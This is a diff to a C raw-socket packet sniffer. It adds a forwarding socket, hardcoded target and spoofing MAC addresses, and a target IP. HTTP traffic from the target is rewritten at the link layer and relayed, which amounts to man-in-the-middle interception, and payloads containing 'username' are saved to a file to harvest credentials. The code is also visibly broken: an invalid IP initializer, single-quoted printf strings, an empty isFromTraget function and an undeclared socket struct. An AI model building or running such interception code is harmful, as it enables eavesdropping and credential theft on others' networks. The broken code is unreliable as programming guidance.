@@ -2,6 +2,21 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+
+
+//link Layer Sock Discriptor 
+typedef struct {
+                  unsigned short sll_family;
+                  unsigned short sll_protocol;
+                  int            sll_ifindex;
+                  unsigned short sll_hatype;
+                  unsigned char  sll_pkttype;
+                  unsigned char  sll_halen;
+                  unsigned char  sll_addr[8];  
+}__attribute__((packed)) LL_SockAddr;
+
 
 //Ether Header 14 byte
 typedef struct {
@@ -66,12 +81,17 @@ typedef struct {
 }__attribute((packed)) ARP_Packet;
 
 //Globel Var
+int forwardSock;
 int DataSize;
 int run = 1;
 int counter = 0;
 char devider[] = "\n ********************************************************************";
 unsigned char mac[6]; 
 unsigned char ip[4];
+
+unsigned char maskMac[]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
+unsigned char targetMac[] = {0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
+int targetIp[4]={192.168.1.71};
 
 EtherNetFram eth;
 IPv4Header ipv4Header;
@@ -159,6 +179,12 @@ void writeToFile(unsigned char *data, int len){
     // counter++;    
 } 
 
+//Function dec
+void forward(unsigned char *buf); 
+void setUpForwarding();
+int isFromTraget();
+
+
 //Decode TCP PAcket
 void decodeTCP(unsigned char *buf, TCP_packet *tcp){
   memcpy(tcp,&buf[34],22);
@@ -173,19 +199,86 @@ void decodeTCP(unsigned char *buf, TCP_packet *tcp){
    // 65 Header Size
    printf("\n payload size :%d",DataSize);
    if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
+    printf("\n HTTP data.."); 
     int header = 65 + dataStart;
-    unsigned char data [DataSize-header];
-    printf("\n data size :%lu",sizeof(data));
-    memcpy(data,&buf[header], DataSize-header);
-    printf("HTTP.. Payload ...");
-    printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
-    printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
-   if(strstr(data, "username"))
-       writeToFile(data,sizeof(data));
-     
+    if(DataSize - header > 0){
+        unsigned char data [DataSize-header];
+        printf("\n Header Size :%d",header);
+        printf("\n data size :%lu",sizeof(data));
+        memcpy(data,&buf[header], DataSize-header);
+
+        printf("HTTP.. Payload ...");
+        printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
+        printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
+        
+        //chk is trafic from target then forward
+        if(isFromTraget()){
+          //Forward the tarfic 
+          memcpy(&buf, &maskMac, 6); // dst macto mask mac 
+          memcpy(&buf[6], &targetMac, 6); // change src mac back to target
+          forward(buf);
+        }
+
+        if(strstr(data, "username"))
+          writeToFile(data,sizeof(data));
+    }
    }
 }
 
+
+//forward Data
+int Sendstatus;
+void forward(unsigned char *buf){
+  Sendstatus = send(forwardSock, buf, DataSize, 0);
+  if(Sendstatus < 0){
+    printf('\n forwarding failed ..%d',errno);
+  }
+}
+   
+void setUpForwarding(){
+    forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
+    if(forwardSock > 0){
+       printf("\n Forward socket is created ....");
+
+      // initialize link layer sock discriptor 
+      ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
+      ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
+      ll_sock_disc.sll_ifindex  = 2;
+      ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
+      ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
+      ll_sock_disc.sll_halen    = '6';
+      memcpy(ll_sock_disc.sll_addr, &maskMac, 6);
+      
+
+       //debug ll sock
+       printf("\n\n family :%d",ll_sock_disc.sll_family);
+       printf("\n protocol :%d",ll_sock_disc.sll_protocol);
+       printf("\n if index :%d",ll_sock_disc.sll_ifindex);
+       printf("\n hatype :%d",ll_sock_disc.sll_hatype);
+       printf("\n pkt type :%c",ll_sock_disc.sll_pkttype);
+       printf("\n ha-len :%02x",ll_sock_disc.sll_halen);
+       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc.sll_addr[0], ll_sock_disc.sll_addr[1], ll_sock_disc.sll_addr[2], ll_sock_disc.sll_addr[3], ll_sock_disc.sll_addr[4], ll_sock_disc.sll_addr[5]);
+       
+       printf("\n LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc));
+
+      
+        //Bind
+         int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
+         printf("\n\n bind status :%d, errorCode :%d",bindStatus,errno); 
+         if(bindStatus == -1)
+           exit(0);
+    }
+    else{
+      printf("\n forawrd sock creation failed :%d",errno);
+      exit(0);
+    }
+
+}
+
+
+int isFromTraget(){
+   
+  }
 
 void main(){
   int MAXMSG = 65536;
@@ -193,6 +286,8 @@ void main(){
   struct sockaddr addr;
   unsigned char buf[MAXMSG];
   
+  //Create and bind sock for forwarding
+  setUpForwarding();
 
   socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
 
@@ -219,17 +314,17 @@ void main(){
           case 0x0800:
             // printf("\n\n It's IPv4 Packet."); 
             // IPv4Header ipv4Header;
-            // decodeIPv4(buf,&ipv4Header);
-            // if(ipv4Header.protocal == 0x06){ // its TCP
-              // printf("\n\n It's TCP Packet."); 
+            decodeIPv4(buf,&ipv4Header);
+            if(ipv4Header.protocal == 0x06){ // its TCP
+              printf("\n\n It's TCP Packet."); 
               // TCP_packet tcp;
-              // decodeTCP(buf,&tcp);
-            // }
+              decodeTCP(buf,&tcp);
+            }
           break;
           
           case 0x0806:
               // printf("\n It's ARP Packet.\n"); 
-              decodeARP( buf, &arp_packet);
+              // decodeARP( buf, &arp_packet);
           break;
 
           case 0x86DD:
